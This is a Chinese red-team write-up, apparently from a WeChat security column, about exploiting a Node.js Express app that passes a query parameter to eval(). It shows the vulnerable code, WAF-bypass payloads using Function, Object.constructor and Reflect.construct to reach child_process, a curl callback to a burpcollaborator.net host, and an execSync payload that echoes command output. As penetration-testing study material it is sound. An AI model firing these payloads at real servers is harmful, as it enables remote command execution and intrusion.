\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MzAwMzYxNzc1OA==&mid=2247487208&idx=1&sn=a6fba4102f167b4872f39b0c148723df&chksm=9b392859ac4ea14fe04f3819b45897b12907e61c914040723b79faebfff10659e2504041a2e8&mpshare=1&scene=1&srcid=1013f5qWlNcB6JkjEyvcVxm9&sharer\_sharetime=1602548751028&sharer\_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=1fd465a69b407b1c7682f6b86f07034c2b0f29c361ea5f1ee80dd8899abad1fb37048a99fc521161baa87b2b2b20357a6201e5919fd54691d05937b1d65d8f26efd035b6f16eebe1e07c4c281f9029d37deb3422b63b7d802e484646b45dfa7ab7154b0451f491918d6fde52b16fcc117bc5ed1e756e99f8f157008ffae54f39&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=6300002f&lang=zh\_CN&exportkey=AYymDvn9uraDccSxFkHN1sU%3D&pass\_ticket=2G6SwO4uyYCX4aTiQDJvW1D1IrAJXn1CnpH%2BbX1rykSOMZNKPaotYwa2vyHnTBud&wx\_header=0)

这是 **酒仙桥六号部队** 的第 **87** 篇文章。

全文共计 668 个字，预计阅读时长 3 分钟。

**前言**

在某个行业 hw 中的一次红蓝对抗，被 waf 封的头皮发麻。在反序列化打不进去，弱口令也爆破不出来的时候。发现了一个突破的站点。

**分析**

这个网站是一个 nodejs 的网站，用的 express 框架。这个可以从返回数据包看出来，

X-Powered-By: Express

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s55PX2pekFq49pCT8Aw8Lj5ZTGyflEPTj8o3ZO70ufWwQwKmqVHeiayn11MxpnXg35slPWARY7tUA4w/640?wx_fmt=jpeg)

根据静态资源的部分特征，github 上搜索到部分相关代码。

**代码**

这里把相关代码简化下。大概如下：

```
var express = require('express');

var app = express();

var funcs = {

           getList: getReadMsg,

           getMsg: "getMsg",

};

function getReadMsg() {

       console.log('aaaaaa')

       }

app.get('/', function(req, res) {

           var resp=eval('funcs.' + req.query.test);

           res.send('Response</br>'+resp);

});

app.listen(8001);

console.log('Server runing at http://127.0.0.1:8001/');
```

本地测试环境比较顺利，Node.js 中的 chile\_process.exec 调用的是 bash，它是一个 bash 解释器，可以执行系统命令。在 eval 函数的参数中可以构造 require('child\_process').exec(''); 来进行调用。

```
require('child\_process').exec('');
```

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s55PX2pekFq49pCT8Aw8Lj5Z9HAxhgIJymh7Qbn73uYe1TKLcHcJEoDuSAFZLRPic6HIicYmqSmRE4qw/640?wx_fmt=png)

**WAF**

线上环境测试遇到 WAF，通过测试发现对 eval 这个函数进行了过滤。这里可以使用如下的方法去绕过。

```
test=Function(require('child\_process').exec('curl+547q0etugr2fu1ehjlkto83s1j79vy.burpcollaborator.net'))()
```

或者使用这几个：

```
test=getList(1);Object.constructor(payload)()

test=getList(1);Reflect.construct(Function,\[payload\])()
```

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s55PX2pekFq49pCT8Aw8Lj5Z8ibI2fyNDaMjgSUOzddbtgmHnamPkGWVycrUian38n5QChicIUbjYEMiaw/640?wx_fmt=png)

到了最关键的一步，去线上测试下漏洞，执行了下发现没有看到 dnslog，反复研究后发现，这台服务器不能出网。由于这个命令执行没得回显，这个漏洞显得有点鸡肋。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s55PX2pekFq49pCT8Aw8Lj5ZlmAibLKd92n4YVwQTJwSibZicEbVxBO4mHuZqqYmlU24QJQDJia12QMVGA/640?wx_fmt=jpeg)

**回显**

然后使用了 res.send。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s55PX2pekFq49pCT8Aw8Lj5Ztl9ibdKicUYx85akYj1z5IVPWib3MYoUzPTZYm0NzBia9dBTwGjnHEgllA/640?wx_fmt=jpeg)

使用如下 payload：

```
Reflect.construct(Function,\[res.send(require('child\_process').execSync('ifconfig'))\])()
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s55PX2pekFq49pCT8Aw8Lj5Zj2ZYiaZciaBD7lmmp2dKruBYRibFAicscfbB51ibcLeEkhC6mGsNoLQcIVQ/640?wx_fmt=jpeg)

显示无法读取未定义的属性，这个是前面函数没有闭合导致的报错。直接闭合函数，就成功回显命令。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s55PX2pekFq49pCT8Aw8Lj5ZPkqjHd0JpqYhWaEBI0icIy5O97KAoUClsl5HQtF9Be3H6tCcibicb9ScA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s564Abiad4b2nUggeFBz8QyCib3tHSia4iaVNVeRfP12IWicjQwfVekvflKEC9XqUJGK8r6TMhcYd3GFw0g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s564Abiad4b2nUggeFBz8QyCibiaRBNn0A5YI88OyFjU8fn2Isf9bat4vQn18NwG6cXxVOSuKiapNm2nibQ/640?wx_fmt=png)